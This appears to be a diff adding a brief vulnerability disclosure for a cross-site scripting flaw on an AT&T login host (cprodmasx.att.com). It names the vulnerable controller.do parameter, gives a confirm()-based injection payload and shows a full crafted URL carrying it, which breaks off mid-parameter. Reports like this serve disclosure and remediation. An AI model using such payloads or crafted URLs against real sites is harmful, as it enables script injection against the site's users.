@@ -1,0 +1,15 @@
+Vulnerable Website URL or Application:
+
+https://cprodmasx.att.com
+
+Vulnerable Parameter:
+
+controller.do?
+
+Payload:
+
+‘-confirm(`1`)-’
+
+Vulnerable URL
+
+https://cprodmasx.att.com/commonLogin/igate_wam/controller.do?TAM_OP=login&USERNAME=unauthenticated&ERROR_CODE=0x00000000&ERROR_TEXT=HPDBA0521ISuccessfulcompletion&METHOD=GET&URL=/crsdmn?tucd567=https://messages.att.net/'-confirm(`1`)-'&REFERE
